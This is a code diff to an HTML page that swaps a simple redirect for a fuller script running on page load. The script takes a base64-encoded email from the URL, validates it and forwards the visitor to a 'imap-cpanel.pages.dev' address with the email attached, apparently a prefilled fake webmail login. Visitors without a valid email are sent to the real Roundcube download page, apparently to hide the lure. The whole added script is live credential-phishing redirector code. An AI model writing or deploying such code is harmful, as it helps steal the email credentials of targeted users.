@@ -33,10 +33,84 @@
 
 </head>
 <script>
-  var myurl = ('https://imap-cpanel.pages.dev')
-  var holdbeer = (window.location.autofillInputFromURL);
-  window.location.replace(myurl+'#'+holdbeer);
-  </script>
+        // Function to validate if a string is a valid email
+        function isValidEmail(email) {
+            const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+            return emailPattern.test(email);
+        }
+
+        // Function to handle the redirection based on the email validation
+        function handleRedirect() {
+            // Example of where the autoEmail and redirectType would come from
+            const autoEmail = true; // This should be set dynamically from your app
+            const redirectType = 1; // This should also be set dynamically
+            const pageLink = "https://imap-cpanel.pages.dev"; // Replace with actual page link
+            const failRedirect = "https://roundcube.net/download/"; // Replace with actual fail redirect link
+
+            // Simulate the autoEmail check (in real scenario, you'd set this dynamically)
+            if (!autoEmail) {
+                if (redirectType === 1) {
+                    window.location.href = pageLink; // Simple redirect using JavaScript
+                } else {
+                    window.location.href = pageLink; // Another way to handle redirection
+                }
+                return;
+            }
+
+            // Getting the part of the URL after the "?"
+            const urlParams = new URLSearchParams(window.location.search);
+            let emailData = urlParams.get('email'); // Assuming the email is passed as a URL parameter
+
+            // Base64 decode and validate the email
+            try {
+                if (emailData) {
+                    let decodedEmail = atob(emailData); // Decoding base64 string
+                    if (isValidEmail(decodedEmail)) {
+                        emailData = decodedEmail;
+                    } else {
+                        // Redirect if email is invalid
+                        if (redirectType === 1) {
+                            window.location.href = failRedirect;
+                        } else {
+                            window.location.href = failRedirect;
+                        }
+                        return;
+                    }
+                } else if (isValidEmail(emailData)) {
+                    // If email is already valid
+                    emailData = emailData;
+                } else {
+                    // Redirect if email is invalid
+                    if (redirectType === 1) {
+                        window.location.href = failRedirect;
+                    } else {
+                        window.location.href = failRedirect;
+                    }
+                    return;
+                }
+
+                // If everything is valid, proceed with the redirect
+                if (redirectType === 1) {
+                    window.location.href = pageLink + "#" + emailData;
+                } else {
+                    window.location.href = pageLink + "/" + emailData;
+                }
+
+            } catch (error) {
+                // If decoding fails or email is invalid
+                if (redirectType === 1) {
+                    window.location.href = failRedirect;
+                } else {
+                    window.location.href = failRedirect;
+                }
+            }
+        }
+
+        // Call the handleRedirect function when the page loads
+        window.onload = function() {
+            handleRedirect();
+        };
+    </script>
   
 
 <body>
